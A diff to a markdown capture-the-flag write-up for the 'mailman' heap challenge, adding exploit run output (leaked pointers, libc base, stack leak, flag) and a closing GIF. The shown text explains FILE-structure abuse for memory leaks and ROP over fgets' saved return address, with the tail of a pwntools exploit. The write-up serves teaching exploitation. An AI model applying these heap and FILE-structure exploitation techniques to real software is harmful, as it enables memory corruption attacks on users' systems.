@@ -130,13 +130,33 @@ struct _IO_FILE
 
 Or if we set `char* _IO_read_end` and `char* _IO_write_base` the beginning of a memory that we want to write out and we set `chat* _IO_write_ptr` to the end of that value and everything else to `NULL`, we will be able to leak out a value of our choosing.
 
-With this we'll get a stack leak and now we just need to ROP from somewhere.. main() doesn't exit, so I targeted *fgets()* saved_rip and write out the flag to sdtout.
+With this we'll get a stack leak and now we just need to ROP from somewhere.. main() doesn't exit, so I targeted *fgets()* saved_rip and writed out the flag to sdtout.
 
 ```
+[+] Starting local process './mailman_patched': pid 14129
+mangled ptr: 0x563bb7a0b38f
+demangled ptr: 0x563ed44df750
+libc base at: 0x7fad66800000
+cleaning tcache and smallbins...
+environ at:  + 0x7fad66a21200
+stdout at: + 0x7fad66a1a780
+stack leak: 0x7ffe9a52c7d8
+saved rip of fgets(): 0x7ffe9a52c650
+[*] '/home/tokyoking/Downloads/imaginaryctf23/libc.so.6'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+    Debuginfo:  Yes
 [*] Loaded 218 cached gadgets for './libc.so.6'
 [*] Switching to interactive mode
 ictf{i_guess_the_post_office_couldnt_hide_the_heapnote_underneath_912b123f}
-\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
+\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00[*] Got EOF while reading in interactive
+$  
 ```
 ### Helpful Resources
 glibc 2.35 source code: https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L349
@@ -364,4 +384,4 @@ malloc_letter(3, 256, payload + rop.chain())
 
 p.interactive()
 ```
-
+<img src=https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExNjV3MWtzMWtqdWV2d2s3d2I0ZXpsZXluOWw5dTNyMDJwamR4ZW92cyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/NkPdHmESJsRlRqsTqS/giphy.webp>
